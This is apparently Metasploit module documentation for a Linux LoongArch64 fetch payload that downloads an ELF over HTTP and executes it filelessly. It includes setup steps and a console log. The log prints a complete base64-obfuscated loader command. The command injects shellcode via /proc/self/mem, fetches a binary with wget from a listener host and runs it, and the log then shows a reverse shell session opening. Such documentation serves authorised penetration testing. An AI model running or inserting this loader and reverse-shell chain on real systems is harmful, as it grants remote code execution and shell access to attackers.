## Vulnerable Application

This adapter downloads a Linux LoongArch64 ELF over HTTP and executes it.
It can wrap compatible payloads such as `linux/loongarch64/shell_reverse_tcp`.
No vulnerable application is required; the generated command must be executed
on a Linux LoongArch64 system with the selected download utility installed.

## Verification Steps

1. Prepare a Linux LoongArch64 host with WGET and `/bin/sh`.
1. Start `./msfconsole` and select `use exploit/multi/handler`.
1. Set `PAYLOAD` to `cmd/linux/http/loongarch64/shell_reverse_tcp`.
1. Set `LHOST` to the listener address and `LPORT` to the callback port.
1. Set `FETCH_COMMAND` to `WGET`, `FETCH_FILELESS` to `shell`, and `VERBOSE` to `true`.
1. Run the handler and execute the printed fetch command on the test host.
1. In the resulting shell, run `id` and `uname -a`.

## Options

### FETCH_FILELESS

`FETCH_FILELESS=python3.8+` requires Python with `os.memfd_create` support.
`FETCH_FILELESS=shell` uses a LoongArch64 memfd loader and requires writable
`/proc/self/mem` and an accessible VDSO mapping. `shell-search` uses an existing
writable memfd when available, otherwise falling back to a downloaded file.

## Scenarios

```msf
PAYLOAD => cmd/linux/http/loongarch64/shell_reverse_tcp
LHOST => 10.5.135.210
LPORT => 50101
FETCH_SRVHOST => 10.5.135.210
FETCH_SRVPORT => 8011
FETCH_URIPATH => pr21954-http-fileless
FETCH_COMMAND => WGET
FETCH_FILELESS => shell
ExitOnSession => false
VERBOSE => true
[*] Command to execute on target: echo -n 'd3JpdGVieXRlcyAoKSB7IHByaW50ZiBcXCUwM28gIiRAIiA7IH07dmRzb19hZGRyPSQoKDB4JChncmVwIC1GICJbdmRzb10iIC9wcm9jLyQkL21hcHMgfCBjdXQgLWQnLScgLWYxKSkpO2ptcD0iMGMwMDAwMTg4YzQxYzAyODgwMDEwMDRjMDAwMDQwMDMiJCh2PSQocHJpbnRmICUwMTZ4ICR2ZHNvX2FkZHIpOyBpZiBbICQoKCR7I3Z9ICUgMikpIC1uZSAwIF07IHRoZW4gdj0iMCR2IjsgZmk7IG89OyB3aGlsZSBbIC1uICIkdiIgXTsgZG8gbz0kbyR7diMiJHt2JT8/fSJ9OyB2PSR7diU/P307IGRvbmU7IGVjaG8gIiRvIik7c2M9JzA1MDA4MDAzNjNjMGZmMDI2MDAwYzAyOTY0MDAxNTAwMGI1Yzg0MDMwMDAwMmIwMDBiYjg4MDAzMDAwMDJiMDAwYmIwODIwMzAwMDAyYjAwMDU0YzgwMDMwYjA0ODIwMzAwMDAyYjAwJztyZWFkIHN5c2NhbGxfaW5mbyA8IC9wcm9jL3NlbGYvc3lzY2FsbDthZGRyPSQoKCQoZWNobyAkc3lzY2FsbF9pbmZvIHwgY3V0IC1kJyAnIC1mOSkpKTtleGVjIDM+L3Byb2Mvc2VsZi9tZW07ZGQgYnM9MSBza2lwPSR2ZHNvX2FkZHIgPCYzID4vZGV2L251bGwgMj4mMTtwcmludGYgIiQod3JpdGVieXRlcyBgcHJpbnRmICRzYyB8IHNlZCAncy8uXHsyXH0vMHgmIC9nJ2ApIiA+JjM7ZXhlYyAzPiYtO2V4ZWMgMz4vcHJvYy9zZWxmL21lbTtkZCBicz0xIHNraXA9JGFkZHIgPCYzID4vZGV2L251bGwgMj4mMTtwcmludGYgIiQod3JpdGVieXRlcyBgcHJpbnRmICRqbXAgfCBzZWQgJ3MvLlx7Mlx9LzB4JiAvZydgKSIgPiYzOw==' | base64 -d | ${SHELL} & cd /proc/$!;og_process=$!;sleep 2;FOUND=0;if [ $FOUND -eq 0 ];then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];then if (wget -qO $f http://10.5.135.210:8011/pr21954-http-fileless) >/dev/null && [ "$(dd if=$f bs=1 count=4 2>/dev/null)" = "$(printf '\177ELF')" ];then $f & FOUND=1;break;fi;fi;done;fi;sleep 2;kill -9 $og_process;
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Fetch handler listening on 10.5.135.210:8011
[*] HTTP server started
[*] Adding resource /pr21954-http-fileless
[*] Started reverse TCP handler on 10.5.135.210:50101
msf exploit(multi/handler) > [*] Client 10.5.132.181 requested /pr21954-http-fileless
[*] Sent payload to 10.5.132.181 (Wget/1.20.1 (linux-gnu))
[*] Command shell session 1 opened (10.5.135.210:50101 -> 10.5.132.181:52774) at 2026-10-20 15:32:37 -0500
sessions -i 1
[*] Starting interaction with 1...

uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),114(bluetooth),116(scanner),117(lpadmin)
Linux morefinels64 4.19.0-19-loongson-3 #1 SMP 4.19.190.8.26 Wed Oct 15 02:40:20 UTC 2025 loongarch64 loongarch64 loongarch64 GNU/Linux
[*] 10.5.132.181 - Command shell session 1 closed.

```
